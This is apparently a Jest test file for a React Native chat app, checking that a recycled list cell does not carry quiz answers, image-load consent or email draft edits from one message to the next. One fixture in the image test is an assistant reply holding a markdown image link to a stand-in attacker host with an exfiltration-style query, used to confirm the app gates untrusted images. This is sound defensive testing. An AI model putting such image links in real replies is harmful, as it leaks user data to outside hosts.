/**
 * FlashList v2 draws `renderItem` in cells keyed by a recycle-pool key: a cell
 * scrolled away is reused for another message of the same type. Each message
 * starts afresh in it — nothing one reply's quiz, image or email card held
 * carries into another — while a reply that streams into its cell keeps its
 * views when it is saved (its renderKey is the same).
 */
import { act, fireEvent, render } from "@testing-library/react-native";
import { View } from "react-native";

import { EmailDraftPersistProvider } from "@/features/drafts/context/emailDraftPersist";
import { useChatMessageList } from "@/features/chat/hooks/useChatMessageList";
import type { Message } from "@/lib/api";
import { publishStreamingDraft } from "@/features/chat/model/streamingDraftStore";

const mockMounts = new Map<string, number>();

jest.mock("@/components/LinkPreviewCard", () => ({ LinkPreviewCard: "LinkPreviewCard" }));
// The emoji setting is read from the signed-in user; these rows have none.
jest.mock("@/contexts/AuthContext", () => ({ useAuthOptional: () => null }));
jest.mock("@/features/chat/components/MessageActions", () => ({
  AssistantActions: () => null,
  UserActions: () => null,
  MESSAGE_ACTION_ROW_HEIGHT: 44,
}));
jest.mock("@/features/suggestions/components/RelatedPromptLines", () => ({ RelatedPromptLines: () => null }));
jest.mock("@/features/chat/components/SettingsProposalCard", () => ({ SettingsProposalCard: () => null }));
jest.mock("@/features/todos/components/ReminderProposalCard", () => ({ ReminderProposalCard: () => null }));
jest.mock("@/components/rich/PlacesListBlock", () => ({ PlacesListBlock: () => null }));
jest.mock("@/features/attachments/components/ChatMessageImageStrip", () => ({ ChatMessageImageStrip: () => null }));
jest.mock("@/features/images/components/ImageGenPlaceholder", () => ({ ImageGenPlaceholder: () => null }));
jest.mock("@/ui/feedback/ActionShimmer", () => ({ ActionShimmer: () => null }));
jest.mock("@/features/chat/components/SearchSourcesStack", () => ({ SearchSourcesStack: () => null }));
jest.mock("@/features/chat/components/RecallTypingIndicator", () => ({ RecallTypingIndicator: () => null }));
jest.mock("@/features/chat/components/UserMessageContent", () => ({ UserMessageContent: () => null }));
jest.mock("@/lib/haptics", () => ({
  tap: jest.fn(),
  selection: jest.fn(),
  notifySuccess: jest.fn(),
  notifyWarning: jest.fn(),
}));
jest.mock("react-i18next", () => ({
  ...jest.requireActual("react-i18next"),
  useTranslation: () => ({ t: (key: string) => key }),
}));
jest.mock("@/components/rich/MathText", () => {
  const { Text } = jest.requireActual<typeof import("react-native")>("react-native");
  const { useEffect: useMountEffect } = jest.requireActual<typeof import("react")>("react");
  return {
    MathText: ({ latex }: { latex: string }) => {
      useMountEffect(() => {
        mockMounts.set(latex, (mockMounts.get(latex) ?? 0) + 1);
      }, []);
      return <Text>{latex}</Text>;
    },
  };
});

const FENCE = "```";
const A_ID = "11111111-1111-1111-1111-111111111111";
const B_ID = "22222222-2222-2222-2222-222222222222";
const reply = (id: string, content: string): Message =>
  ({ id, role: "assistant", content, model: "free-chat", created_at: "2026-10-01T10:00:01Z" }) as Message;
const quiz = (question: string, options: string[], answer: number) =>
  `${FENCE}quiz\n${JSON.stringify({ question, options, answer, explanation: "Because." })}\n${FENCE}\n`;
const email = (subject: string, body: string) =>
  `Here is a draft.\n\n${FENCE}email\nSubject: ${subject}\n\n${body}\n${FENCE}\n`;

/** One pool cell: whichever message it is handed, under the same key. */
function Cell({ item, streaming = false }: { item: Message; streaming?: boolean }) {
  const { renderItem } = useChatMessageList({
    messages: [item],
    streaming,
    finalizing: false,
    selectedModel: "free-chat",
    highlightedMessageId: null,
    sendingMessageId: null,
    setMenuVisible: () => {},
    regenerateResponse: () => {},
    handleFeedback: () => {},
  });
  return <View key="pool-cell">{renderItem({ item, index: 0 })}</View>;
}

beforeEach(() => {
  mockMounts.clear();
  publishStreamingDraft(null);
});
afterEach(() => publishStreamingDraft(null));

describe("a list cell reused for another message", () => {
  it("shows the other message's quiz unanswered", async () => {
    const a = reply(A_ID, `Exercise.\n\n${quiz("What is 2+2?", ["3", "4", "5"], 1)}`);
    const b = reply(B_ID, `Exercise.\n\n${quiz("Capital of France?", ["Berlin", "Madrid", "Paris"], 2)}`);
    const view = await render(<Cell item={a} />);
    await act(async () => {
      fireEvent.press(view.getAllByRole("radio")[0]!);
    });
    expect(view.getAllByRole("radio")[0]!.props.accessibilityState?.checked).toBe(true);

    await act(async () => {
      view.rerender(<Cell item={b} />);
    });
    expect(view.getAllByRole("radio").map((radio) => radio.props.accessibilityState?.checked)).toEqual([
      false,
      false,
      false,
    ]);
  });

  it("asks before loading the other reply's image, whatever was tapped before", async () => {
    const a = reply(A_ID, "Look:\n\n![a](https://untrusted.example.com/a.png)\n");
    const b = reply(B_ID, "Look:\n\n![b](https://attacker.example.net/exfil?d=secret)\n");
    const view = await render(<Cell item={a} />);
    await act(async () => {
      fireEvent.press(view.getByTestId("tap-to-load-image"));
    });
    expect(view.queryByTestId("tap-to-load-image")).toBeNull();

    await act(async () => {
      view.rerender(<Cell item={b} />);
    });
    expect(view.getByTestId("tap-to-load-image")).toBeTruthy();
  });

  it("neither shows nor saves an email edit from the other reply", async () => {
    jest.useFakeTimers();
    try {
      const save = jest.fn(async () => true);
      const a = reply(A_ID, email("Rent for October", "Hi Sam, ..."));
      const b = reply(B_ID, email("Dinner on Friday", "Hey Alex, ..."));
      const view = await render(
        <EmailDraftPersistProvider save={save}>
          <Cell item={a} />
        </EmailDraftPersistProvider>,
      );
      await act(async () => {
        fireEvent.press(view.getByLabelText("chat.email_card_edit"));
      });
      await act(async () => {
        fireEvent.changeText(view.getByPlaceholderText("chat.email_card_subject_placeholder"), "Private edit for A");
      });

      await act(async () => {
        view.rerender(
          <EmailDraftPersistProvider save={save}>
            <Cell item={b} />
          </EmailDraftPersistProvider>,
        );
      });
      expect(view.queryByPlaceholderText("chat.email_card_subject_placeholder")).toBeNull();
      expect(view.queryByDisplayValue("Private edit for A")).toBeNull();
      await act(async () => {
        jest.advanceTimersByTime(5_000);
      });
      expect(save.mock.calls.filter((call) => (call as unknown[])[0] === B_ID)).toEqual([]);
    } finally {
      jest.useRealTimers();
    }
  });
});

describe("a reply streaming into a cell", () => {
  it("keeps its views when saved, and a later message in the cell starts afresh", async () => {
    jest.useFakeTimers();
    try {
      const text = `Start from $a^2 + b^2$ and work through it.\n\nThen $c^2$ is the sum.\n`;
      const live = { ...reply("streaming", ""), renderKey: "stream-1" };
      const view = await render(<Cell item={live} streaming />);
      await act(async () => {
        jest.advanceTimersByTime(40);
        publishStreamingDraft({ content: text });
      });
      const whileStreaming = Object.fromEntries(mockMounts);
      expect(Object.keys(whileStreaming)).toEqual(expect.arrayContaining(["c^2"]));

      await act(async () => {
        publishStreamingDraft(null);
        view.rerender(<Cell item={{ ...live, id: A_ID, content: text }} />);
      });
      expect(Object.fromEntries(mockMounts)).toEqual(whileStreaming);

      // The cell is reused for another message with the same formula: drawn anew.
      await act(async () => {
        view.rerender(<Cell item={reply(B_ID, text)} />);
      });
      expect(mockMounts.get("c^2")).toBe((whileStreaming["c^2"] ?? 0) + 1);
    } finally {
      jest.useRealTimers();
    }
  });
});
